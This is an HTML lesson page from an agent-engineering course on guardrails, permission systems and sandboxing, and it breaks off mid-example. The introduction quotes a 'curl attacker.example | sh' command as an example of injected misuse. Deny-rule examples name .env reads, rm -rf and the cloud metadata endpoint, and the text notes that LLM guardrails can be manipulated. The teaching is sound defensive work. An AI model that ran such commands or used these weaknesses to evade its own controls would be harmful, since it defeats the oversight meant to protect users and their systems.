@@ -1,0 +1,714 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Guardrails, Permissions &amp; Sandboxing · Agent Academy</title>
+<meta name="description" content="Defense in depth for agents: input and output guardrails, permission systems and policy engines, hooks and spend caps, and sandboxes from containers to microVMs.">
+<meta property="og:title" content="Guardrails, Permissions &amp; Sandboxing · Agent Academy">
+<meta property="og:description" content="Defense in depth for agents: input and output guardrails, permission systems and policy engines, hooks and spend caps, and sandboxes from containers to microVMs.">
+<meta name="theme-color" content="#7c5cff">
+<link rel="icon" href="assets/favicon.svg" type="image/svg+xml">
+<script>(function(){try{var t=localStorage.getItem('aa-theme');if(!t){t=matchMedia('(prefers-color-scheme: dark)').matches?'dark':'light'}document.documentElement.dataset.theme=t}catch(e){}})();</script>
+<link rel="stylesheet" href="assets/styles.css">
+</head>
+<body data-page="lesson" data-mermaid="1">
+<a class="skip-link" href="#main">Skip to content</a>
+<div class="read-progress" aria-hidden="true"></div>
+<header class="site-header">
+  <button class="icon-btn menu-btn" type="button" aria-label="Open navigation" aria-expanded="false"><svg viewBox="0 0 24 24" width="20" height="20" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" d="M4 6h16M4 12h16M4 18h16"/></svg></button>
+  <a class="brand" href="index.html"><svg viewBox="0 0 32 32" width="26" height="26" aria-hidden="true"><defs><linearGradient id="lg" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#7c5cff"/><stop offset="1" stop-color="#22c3ee"/></linearGradient></defs><rect x="2" y="2" width="28" height="28" rx="8" fill="url(#lg)"/><path d="M10 21.5 16 9l6 12.5M12.3 17h7.4" fill="none" stroke="#fff" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/><circle cx="23.5" cy="9.5" r="2.2" fill="#fff"/></svg><span>Agent Academy</span></a>
+  <nav class="top-nav" aria-label="Main">
+    <a href="curriculum.html">Curriculum</a><a href="paths.html">Paths</a><a href="lab.html">Lab</a><a href="glossary.html">Glossary</a><a href="papers.html">Reading List</a><a href="cheatsheet.html">Cheat Sheet</a>
+  </nav>
+  <div class="header-actions">
+    <button class="search-btn" type="button" aria-label="Search (Ctrl+K)"><svg viewBox="0 0 24 24" width="16" height="16" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" d="M11 4a7 7 0 1 0 0 14 7 7 0 0 0 0-14zm9 16-4.3-4.3"/></svg><span>Search</span><kbd>⌘K</kbd></button>
+    <a class="progress-pill" href="progress.html" title="Your progress"><span class="pp-ring"></span><span class="pp-text">0%</span></a>
+    <button class="icon-btn theme-btn" type="button" aria-label="Toggle dark mode"><svg class="i-sun" viewBox="0 0 24 24" width="18" height="18" aria-hidden="true"><g fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></g></svg><svg class="i-moon" viewBox="0 0 24 24" width="18" height="18" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="2" stroke-linejoin="round" d="M20 14.5A8.5 8.5 0 1 1 9.5 4a7 7 0 0 0 10.5 10.5z"/></svg></button>
+  </div>
+</header>
+<div class="mobile-nav" hidden>
+  <a href="curriculum.html">Curriculum</a><a href="paths.html">Paths</a><a href="lab.html">Lab</a><a href="glossary.html">Glossary</a><a href="papers.html">Reading List</a><a href="cheatsheet.html">Cheat Sheet</a>
+  <a href="progress.html">Progress</a><a href="flashcards.html">Flashcards</a><a href="exam.html">Practice Exam</a>
+</div>
+<div class="layout-lesson">
+<aside class="sidebar" aria-label="Course navigation">
+  <div class="sidebar-inner">
+    <a class="sidebar-home" href="curriculum.html">← Full curriculum</a>
+    <details class="side-module"  data-module="foundations">
+      <summary><span class="side-mod-icon">🧭</span><span class="side-mod-title"><small>Module 1</small>Foundations</span><span class="side-mod-count" data-module-count="foundations"></span></summary>
+      <ol>
+        <li><a href="what-is-an-agent.html" data-slug="what-is-an-agent"><span class="side-check"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="m5 12 5 5 9-10"/></svg></span><span>What Is an AI Agent?</span></a></li>
+        <li><a href="history-of-agents.html" data-slug="history-of-agents"><span class="side-check"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="m5 12 5 5 9-10"/></svg></span><span>A Brief History of AI Agents</span></a></li>
+        <li><a href="llm-fundamentals.html" data-slug="llm-fundamentals"><span class="side-check"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="m5 12 5 5 9-10"/></svg></span><span>LLMs: The Engine Inside Every Agent</span></a></li>
+        <li><a href="the-agent-loop.html" data-slug="the-agent-loop"><span class="side-check"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="m5 12 5 5 9-10"/></svg></span><span>The Agent Loop</span></a></li>
+        <li><a href="when-to-use-agents.html" data-slug="when-to-use-agents"><span class="side-check"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="m5 12 5 5 9-10"/></svg></span><span>Agents vs. Workflows: When (Not) to Build an Agent</span></a></li>
+      </ol>
+    </details>
+<details class="side-module"  data-module="building-blocks">
+      <summary><span class="side-mod-icon">🧱</span><span class="side-mod-title"><small>Module 2</small>Core Building Blocks</span><span class="side-mod-count" data-module-count="building-blocks"></span></summary>
+      <ol>
+        <li><a href="prompting-for-agents.html" data-slug="prompting-for-agents"><span class="side-check"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="m5 12 5 5 9-10"/></svg></span><span>Prompt Engineering for Agents</span></a></li>
+        <li><a href="tool-use.html" data-slug="tool-use"><span class="side-check"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="m5 12 5 5 9-10"/></svg></span><span>Tool Use &amp; Function Calling</span></a></li>
+        <li><a href="designing-tools.html" data-slug="designing-tools"><span class="side-check"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="m5 12 5 5 9-10"/></svg></span><span>Designing Great Tools (The Agent–Computer Interface)</span></a></li>
+        <li><a href="structured-outputs.html" data-slug="structured-outputs"><span class="side-check"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="m5 12 5 5 9-10"/></svg></span><span>Structured Outputs &amp; Control Flow</span></a></li>
+        <li><a href="reasoning-and-planning.html" data-slug="reasoning-and-planning"><span class="side-check"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="m5 12 5 5 9-10"/></svg></span><span>Reasoning &amp; Planning</span></a></li>
+        <li><a href="memory.html" data-slug="memory"><span class="side-check"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="m5 12 5 5 9-10"/></svg></span><span>Memory Systems</span></a></li>
+        <li><a href="rag-and-retrieval.html" data-slug="rag-and-retrieval"><span class="side-check"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="m5 12 5 5 9-10"/></svg></span><span>Retrieval &amp; Agentic RAG</span></a></li>
+        <li><a href="context-engineering.html" data-slug="context-engineering"><span class="side-check"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="m5 12 5 5 9-10"/></svg></span><span>Context Engineering</span></a></li>
+      </ol>
+    </details>
+<details class="side-module"  data-module="architectures">
+      <summary><span class="side-mod-icon">🏗️</span><span class="side-mod-title"><small>Module 3</small>Architectures &amp; Patterns</span><span class="side-mod-count" data-module-count="architectures"></span></summary>
+      <ol>
+        <li><a href="workflow-patterns.html" data-slug="workflow-patterns"><span class="side-check"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="m5 12 5 5 9-10"/></svg></span><span>Workflow Patterns</span></a></li>
+        <li><a href="agent-architectures.html" data-slug="agent-architectures"><span class="side-check"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="m5 12 5 5 9-10"/></svg></span><span>Single-Agent Architectures</span></a></li>
+        <li><a href="multi-agent-systems.html" data-slug="multi-agent-systems"><span class="side-check"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="m5 12 5 5 9-10"/></svg></span><span>Multi-Agent Systems</span></a></li>
+        <li><a href="human-in-the-loop.html" data-slug="human-in-the-loop"><span class="side-check"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="m5 12 5 5 9-10"/></svg></span><span>Human-in-the-Loop &amp; Agent UX</span></a></li>
+      </ol>
+    </details>
+<details class="side-module"  data-module="agent-types">
+      <summary><span class="side-mod-icon">🌍</span><span class="side-mod-title"><small>Module 4</small>Agents in the Wild</span><span class="side-mod-count" data-module-count="agent-types"></span></summary>
+      <ol>
+        <li><a href="coding-agents.html" data-slug="coding-agents"><span class="side-check"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="m5 12 5 5 9-10"/></svg></span><span>Coding Agents</span></a></li>
+        <li><a href="computer-use-agents.html" data-slug="computer-use-agents"><span class="side-check"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="m5 12 5 5 9-10"/></svg></span><span>Computer-Use &amp; Browser Agents</span></a></li>
+        <li><a href="research-agents.html" data-slug="research-agents"><span class="side-check"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="m5 12 5 5 9-10"/></svg></span><span>Deep Research Agents</span></a></li>
+        <li><a href="conversational-voice-agents.html" data-slug="conversational-voice-agents"><span class="side-check"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="m5 12 5 5 9-10"/></svg></span><span>Customer-Facing &amp; Voice Agents</span></a></li>
+        <li><a href="agent-use-cases.html" data-slug="agent-use-cases"><span class="side-check"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="m5 12 5 5 9-10"/></svg></span><span>The Agent Landscape: Use Cases by Domain</span></a></li>
+      </ol>
+    </details>
+<details class="side-module"  data-module="building">
+      <summary><span class="side-mod-icon">🛠️</span><span class="side-mod-title"><small>Module 5</small>Building Agents</span><span class="side-mod-count" data-module-count="building"></span></summary>
+      <ol>
+        <li><a href="build-agent-from-scratch.html" data-slug="build-agent-from-scratch"><span class="side-check"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="m5 12 5 5 9-10"/></svg></span><span>Build an Agent From Scratch</span></a></li>
+      </ol>
+    </details>
+<details class="side-module"  data-module="production">
+      <summary><span class="side-mod-icon">🚀</span><span class="side-mod-title"><small>Module 6</small>Production Engineering</span><span class="side-mod-count" data-module-count="production"></span></summary>
+      <ol>
+        <li><a href="evaluating-agents.html" data-slug="evaluating-agents"><span class="side-check"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="m5 12 5 5 9-10"/></svg></span><span>Evaluating Agents</span></a></li>
+        <li><a href="benchmarks.html" data-slug="benchmarks"><span class="side-check"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="m5 12 5 5 9-10"/></svg></span><span>Agent Benchmarks</span></a></li>
+        <li><a href="observability.html" data-slug="observability"><span class="side-check"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="m5 12 5 5 9-10"/></svg></span><span>Observability &amp; Debugging</span></a></li>
+        <li><a href="reliability.html" data-slug="reliability"><span class="side-check"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="m5 12 5 5 9-10"/></svg></span><span>Reliability &amp; Durable Execution</span></a></li>
+        <li><a href="cost-and-latency.html" data-slug="cost-and-latency"><span class="side-check"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="m5 12 5 5 9-10"/></svg></span><span>Cost &amp; Latency Optimization</span></a></li>
+        <li><a href="deployment.html" data-slug="deployment"><span class="side-check"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="m5 12 5 5 9-10"/></svg></span><span>Deploying &amp; Operating Agents</span></a></li>
+      </ol>
+    </details>
+<details class="side-module" open data-module="safety">
+      <summary><span class="side-mod-icon">🛡️</span><span class="side-mod-title"><small>Module 7</small>Safety &amp; Security</span><span class="side-mod-count" data-module-count="safety"></span></summary>
+      <ol>
+        <li><a href="agent-security.html" data-slug="agent-security"><span class="side-check"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="m5 12 5 5 9-10"/></svg></span><span>Agent Security &amp; Prompt Injection</span></a></li>
+        <li><a href="guardrails-and-sandboxing.html" data-slug="guardrails-and-sandboxing" aria-current="page"><span class="side-check"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="m5 12 5 5 9-10"/></svg></span><span>Guardrails, Permissions &amp; Sandboxing</span></a></li>
+        <li><a href="agent-safety-alignment.html" data-slug="agent-safety-alignment"><span class="side-check"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="m5 12 5 5 9-10"/></svg></span><span>Safety, Alignment &amp; Governance</span></a></li>
+      </ol>
+    </details>
+<details class="side-module"  data-module="frontier">
+      <summary><span class="side-mod-icon">🔭</span><span class="side-mod-title"><small>Module 8</small>Advanced &amp; Frontier</span><span class="side-mod-count" data-module-count="frontier"></span></summary>
+      <ol>
+        <li><a href="training-agents.html" data-slug="training-agents"><span class="side-check"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="m5 12 5 5 9-10"/></svg></span><span>Training Agentic Models</span></a></li>
+        <li><a href="self-improving-agents.html" data-slug="self-improving-agents"><span class="side-check"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="m5 12 5 5 9-10"/></svg></span><span>Self-Improving &amp; Open-Ended Agents</span></a></li>
+        <li><a href="future-of-agents.html" data-slug="future-of-agents"><span class="side-check"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="m5 12 5 5 9-10"/></svg></span><span>Open Problems &amp; The Road Ahead</span></a></li>
+      </ol>
+    </details>
+    <div class="side-extra">
+      <a href="cheatsheet.html">📋 Cheat sheet</a>
+      <a href="glossary.html">📖 Glossary</a>
+      <a href="flashcards.html">🃏 Flashcards</a>
+      <a href="exam.html">🎓 Practice exam</a>
+    </div>
+  </div>
+</aside>
+<main id="main" class="lesson" data-slug="guardrails-and-sandboxing">
+  <nav class="breadcrumb"><a href="curriculum.html">Curriculum</a><span>›</span><a href="curriculum.html#safety">Module 7: Safety &amp; Security</a></nav>
+  <header class="lesson-header">
+    <h1>Guardrails, Permissions &amp; Sandboxing</h1>
+    <p class="lead">Defense in depth for agents: input and output guardrails, permission systems and policy engines, hooks and spend caps, and sandboxes from containers to microVMs.</p>
+    <div class="lesson-meta">
+      <span class="badge badge-advanced">Advanced</span>
+      <span>⏱ 35 min</span>
+      <span>✅ 6-question quiz</span>
+      
+      <span>Lesson 31 of 35</span>
+      <span class="lesson-status" data-status-for="guardrails-and-sandboxing"></span>
+    </div>
+  </header>
+  <section class="objectives">
+    <h2 class="objectives-title">What you'll learn</h2><ul><li>Design a defense-in-depth stack for an agent, and explain what each layer catches and misses</li><li>Choose and place input, output and action-level guardrails with sensible latency and cost</li><li>Implement an allow/ask/deny permission system with glob rules and a tamper-evident audit log</li><li>Compare containers, gVisor and microVMs, and harden a sandbox's filesystem, network, credentials and resources</li><li>Reason explicitly about the trade-off between safety and usefulness</li></ul>
+    <p class="prereqs"><strong>Builds on:</strong> <a href="agent-security.html">Agent Security &amp; Prompt Injection</a>, <a href="tool-use.html">Tool Use &amp; Function Calling</a></p>
+  </section>
+  <article class="prose">
+<p>In <a href="agent-security.html">Agent Security &amp; Prompt Injection</a> we reached an uncomfortable conclusion: you cannot make a language model reliably refuse every malicious instruction it reads. So what <em>do</em> you do? You do what security engineers have always done with components they can&#39;t fully trust: you surround them with <strong>controls that don&#39;t depend on the component behaving well</strong>.</p>
+<p>A coding agent that can run shell commands is, from a security standpoint, <em>remote code execution as a service</em>. That&#39;s not a criticism — it&#39;s exactly what makes it useful. The engineering question is how to let it run <code>pytest</code> and <code>npm install</code> a thousand times a day while ensuring that the one time it&#39;s tricked into running <code>curl attacker.example | sh</code>, nothing bad happens: no secrets leak, no production system is touched, nothing persists.</p>
+<p>This lesson is the practical toolkit: <strong>guardrails</strong> that screen what goes in and comes out, <strong>permission systems</strong> that decide which actions run, and <strong>sandboxes</strong> that contain whatever runs anyway. Along the way we&#39;ll build a policy-checked tool executor in Python and a hardened <code>docker run</code> invocation you can adapt.</p>
+<h2 id="defense-in-depth"><a class="anchor" href="#defense-in-depth" aria-hidden="true">#</a>Defense in Depth</h2>
+<p><strong>Defense in depth</strong> means stacking independent layers so that an attack must defeat <em>all</em> of them. It&#39;s often pictured as the &quot;Swiss cheese model&quot;: each slice has holes, but holes rarely line up.</p>
+<p>For agents, the layers are:</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>Layer</th>
+<th>Question it answers</th>
+<th>Examples</th>
+<th>Nature</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Model</td>
+<td>Does the model itself resist misuse?</td>
+<td>Safety training, instruction hierarchy</td>
+<td>Probabilistic</td>
+</tr>
+<tr>
+<td>Input guardrails</td>
+<td>Should this input reach the model?</td>
+<td>Moderation, injection classifiers, PII detection</td>
+<td>Probabilistic</td>
+</tr>
+<tr>
+<td>Output guardrails</td>
+<td>Should this output reach the user or a tool?</td>
+<td>Policy checks, PII redaction, schema validation</td>
+<td>Mixed</td>
+</tr>
+<tr>
+<td>Action guardrails</td>
+<td>Is this specific tool call permitted?</td>
+<td>Allow/ask/deny rules, policy engines, hooks, rate limits</td>
+<td>Deterministic</td>
+</tr>
+<tr>
+<td>Sandbox</td>
+<td>If it runs, what can it touch?</td>
+<td>Containers, gVisor, microVMs, egress allowlists</td>
+<td>Deterministic</td>
+</tr>
+<tr>
+<td>Monitoring &amp; audit</td>
+<td>Did something bad happen, and can we prove what?</td>
+<td>Audit logs, anomaly alerts, kill switches</td>
+<td>Detective</td>
+</tr>
+</tbody></table>
+</div>
+<figure class="diagram"><pre class="mermaid">flowchart LR
+  I[&quot;User input + tool results&quot;] --&gt; IG[&quot;Input guardrails&quot;]
+  IG --&gt; M[&quot;Model&quot;]
+  M --&gt; OG[&quot;Output guardrails&quot;]
+  OG --&gt;|text| U[&quot;User&quot;]
+  OG --&gt;|tool call| AG[&quot;Action guardrails (allow/ask/deny)&quot;]
+  AG --&gt; SB[&quot;Sandbox&quot;]
+  SB --&gt; R[&quot;Result&quot;]
+  R --&gt; IG
+  AG -.-&gt; L[&quot;Audit log&quot;]
+  SB -.-&gt; L</pre></figure>
+<p>Notice the &quot;Nature&quot; column. The upper layers are <strong>probabilistic</strong>: classifiers and models with error rates. The lower layers are <strong>deterministic</strong>: a container with no network route cannot exfiltrate over the network no matter how persuasive the injected prompt. A good design puts your hardest guarantees in the deterministic layers and uses probabilistic layers to reduce noise and catch problems early.</p>
+<aside class="callout callout-key"><div class="callout-title"><span class="callout-icon" aria-hidden="true">🔑</span>Put guarantees where the model can&#39;t argue with them</div><div class="callout-body"><p>A guardrail that is itself an LLM can be manipulated by the same text it&#39;s inspecting. A Linux namespace, a network policy or a permission rule evaluated in plain code cannot. Use probabilistic guardrails to reduce how often bad things are <em>attempted</em>; use deterministic controls to bound what happens when they are.</p>
+</div></aside>
+<h2 id="input-guardrails"><a class="anchor" href="#input-guardrails" aria-hidden="true">#</a>Input Guardrails</h2>
+<p><strong>Input guardrails</strong> inspect content <em>before</em> the model acts on it. That includes the user&#39;s message and, crucially for agents, tool results and retrieved documents.</p>
+<ul>
+<li><strong>Content moderation</strong>: classify inputs against harm categories (violence, sexual content involving minors, self-harm, etc.). Most providers offer moderation endpoints or built-in safety systems; many apps add their own.</li>
+<li><strong>Jailbreak and injection classifiers</strong>: small, fast models trained to recognize attempts to override instructions. Run them on <em>tool outputs</em> as well as user turns, since indirect injection arrives through tools.</li>
+<li><strong>PII detection</strong>: find names, emails, phone numbers, card numbers or health data, then mask, tokenize or block them before they reach a third-party model or a log. Tools range from regex plus checksum validation (Luhn for card numbers) to NER-based libraries like Microsoft Presidio.</li>
+<li><strong>Topic scoping</strong>: keep a narrow agent on task. A banking support agent can decline requests to write poetry or discuss competitors. Implement with a cheap classifier or a fast model call returning an enum.</li>
+</ul>
+<h3 id="placement-and-latency"><a class="anchor" href="#placement-and-latency" aria-hidden="true">#</a>Placement and latency</h3>
+<p>Every guardrail adds latency and cost. Common tactics:</p>
+<ul>
+<li><strong>Run in parallel</strong> with the main model call and cancel the response if the guardrail trips. The OpenAI Agents SDK, for example, models this as guardrails with a &quot;tripwire&quot; that halts the run.</li>
+<li><strong>Tier your checks</strong>: regex and allowlists first (microseconds), small classifiers next (milliseconds), LLM judges only for ambiguous cases.</li>
+<li><strong>Fail closed for high-stakes paths</strong> (if the injection classifier is down, don&#39;t let browsing results reach an agent with payment tools) and <strong>fail open for low-stakes ones</strong> (a topic classifier outage shouldn&#39;t break a FAQ bot).</li>
+</ul>
+<aside class="callout callout-warning"><div class="callout-title"><span class="callout-icon" aria-hidden="true">⚠️</span>Classifier scores are not verdicts</div><div class="callout-body"><p>An injection classifier with a 1% false-negative rate still lets through one in a hundred attacks, and attackers get unlimited tries. It will also flag legitimate content — a security wiki page <em>about</em> prompt injection looks a lot like an attack. Route detections to logging, quarantine or human confirmation, and tune thresholds on your own traffic.</p>
+</div></aside>
+<h2 id="output-guardrails"><a class="anchor" href="#output-guardrails" aria-hidden="true">#</a>Output Guardrails</h2>
+<p><strong>Output guardrails</strong> inspect what the model produces before it reaches a user, a downstream system or a tool.</p>
+<ul>
+<li><strong>Policy checks</strong>: does the response violate content policy, make commitments the business can&#39;t honor (&quot;I&#39;ve approved your refund&quot; when it can&#39;t), or give regulated advice? Often a classifier or a rubric-graded LLM judge.</li>
+<li><strong>PII and secret redaction</strong>: scan for credentials (API-key patterns, private-key headers, high-entropy strings), internal hostnames and personal data before text leaves the system. This is also an <em>exfiltration</em> control.</li>
+<li><strong>Groundedness checks</strong>: for RAG and research agents, verify each claim is supported by a retrieved source — using an entailment (NLI) model or an LLM judge that checks claims against citations. Unsupported claims get removed, flagged or sent back for revision. See <a href="rag-and-retrieval.html">RAG &amp; Retrieval</a>.</li>
+<li><strong>Schema validation</strong>: every tool call and structured output is validated against a schema <em>in code</em>, regardless of whether the model was constrained. Reject or repair invalid output rather than passing it on. <a href="structured-outputs.html">Structured Outputs</a> covers constrained decoding, which makes this cheap.</li>
+<li><strong>Safe rendering</strong>: escape HTML, neutralize markdown images and links to unknown domains, and never <code>eval</code> model output. This is OWASP&#39;s &quot;Improper Output Handling.&quot;</li>
+</ul>
+<h2 id="the-guardrail-toolbox"><a class="anchor" href="#the-guardrail-toolbox" aria-hidden="true">#</a>The Guardrail Toolbox</h2>
+<p>You rarely need to build classifiers from scratch. As of 2026, the common building blocks are:</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>What it is</th>
+<th>Typical use</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Llama Guard</strong> (Meta)</td>
+<td>Open-weight LLMs fine-tuned to classify prompts and responses against a hazard taxonomy</td>
+<td>Self-hosted input/output moderation</td>
+</tr>
+<tr>
+<td><strong>Prompt Guard</strong> (Meta)</td>
+<td>Small open classifier for jailbreak and injection detection</td>
+<td>Screening user turns and tool results</td>
+</tr>
+<tr>
+<td><strong>NeMo Guardrails</strong> (NVIDIA)</td>
+<td>Open-source toolkit; define &quot;rails&quot; (input, output, dialog, retrieval, execution) in a DSL called Colang</td>
+<td>Programmable conversational guardrails</td>
+</tr>
+<tr>
+<td><strong>Guardrails AI</strong></td>
+<td>Python framework with a hub of validators (PII, toxicity, regex, schemas) that can re-ask the model on failure</td>
+<td>Output validation pipelines</td>
+</tr>
+<tr>
+<td><strong>Constitutional Classifiers</strong> (Anthropic)</td>
+<td>Input and output classifiers trained on synthetic data generated from a natural-language &quot;constitution&quot; of allowed and disallowed content</td>
+<td>Blocking universal jailbreaks for high-risk domains (e.g., CBRN)</td>
+</tr>
+<tr>
+<td><strong>Provider moderation services</strong></td>
+<td>Hosted endpoints such as OpenAI&#39;s moderation API and Azure AI Content Safety (including Prompt Shields)</td>
+<td>Quick, managed classification</td>
+</tr>
+</tbody></table>
+</div>
+<p>These evolve quickly; check current documentation for model versions and categories. The design principles are stable: know what each tool detects, measure its precision and recall on your data, and treat it as one layer.</p>
+<h2 id="action-level-guardrails"><a class="anchor" href="#action-level-guardrails" aria-hidden="true">#</a>Action-Level Guardrails</h2>
+<p>This is where agent security diverges most from chatbot safety. The most important question isn&#39;t &quot;is this text harmful?&quot; but &quot;<strong>should this tool call with these arguments run right now?</strong>&quot;</p>
+<h3 id="permission-systems-allow-ask-deny"><a class="anchor" href="#permission-systems-allow-ask-deny" aria-hidden="true">#</a>Permission systems: allow, ask, deny</h3>
+<p>A <strong>permission system</strong> maps each proposed tool call to one of three outcomes:</p>
+<ul>
+<li><strong>Allow</strong>: run without asking (read a file in the workspace, run the test suite).</li>
+<li><strong>Ask</strong>: pause and request human approval (push to a remote, send an email, install a package).</li>
+<li><strong>Deny</strong>: never run, and tell the model it was blocked (read <code>.env</code>, <code>rm -rf</code>, access the cloud metadata endpoint).</li>
+</ul>
+<p>Rules match on the tool name and its arguments, usually with <strong>glob patterns</strong>. Claude Code, for example, configures this in <code>settings.json</code> with rule lists like the following (syntax as of 2026; check current docs):</p>
+<div class="code-block"><div class="code-head"><span class="code-lang">json</span><button type="button" class="copy-btn" aria-label="Copy code">Copy</button></div><pre><code class="hljs language-json"><span class="hljs-punctuation">{</span>
+  <span class="hljs-attr">&quot;permissions&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
+    <span class="hljs-attr">&quot;allow&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;Bash(npm run test:*)&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;Read(./src/**)&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">&quot;ask&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;Bash(git push:*)&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;WebFetch&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
